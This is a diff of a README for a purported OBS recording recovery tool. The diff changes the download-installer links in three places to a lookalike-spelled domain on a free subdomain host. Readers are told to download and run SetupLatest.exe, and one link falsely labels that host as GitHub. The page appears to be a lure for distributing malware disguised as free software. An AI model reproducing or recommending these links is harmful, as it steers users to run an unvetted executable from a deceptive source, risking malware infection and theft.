@@ -2,7 +2,7 @@
 
 Introducing OBS Recording Recovery Tool 2026, a powerful and user-friendly software designed to help content creators and video enthusiasts recover corrupted recordings from OBS Studio. Whether you've experienced an unexpected shutdown, file corruption, or incomplete saves, this tool aims to restore your valuable footage with minimal effort.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -26,7 +26,7 @@ Before installing OBS Recording Recovery Tool, ensure your system meets the foll
 
 Installing OBS Recording Recovery Tool 2026 is a straightforward process:
 
-1. **Download the Installer**: Click on the download button above or use the direct link to obtain the **SetupLatest.exe** file from https://download-page.page.gd/.
+1. **Download the Installer**: Click on the download button above or use the direct link to obtain the **SetupLatest.exe** file from https://downioad.page.gd/.
 
 2. **Run the Installer**: Locate the downloaded **SetupLatest.exe** file in your downloads folder and double-click it to begin installation.
 
@@ -63,6 +63,6 @@ A: Updates are announced on the GitHub repository. Download the latest **SetupLa
 
 To get started, download the latest version of OBS Recording Recovery Tool 2026:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This tool is provided for free to assist users in recovering their important recordings. Last updated: January 2026. For support, issues, or feedback, please visit our GitHub repository.
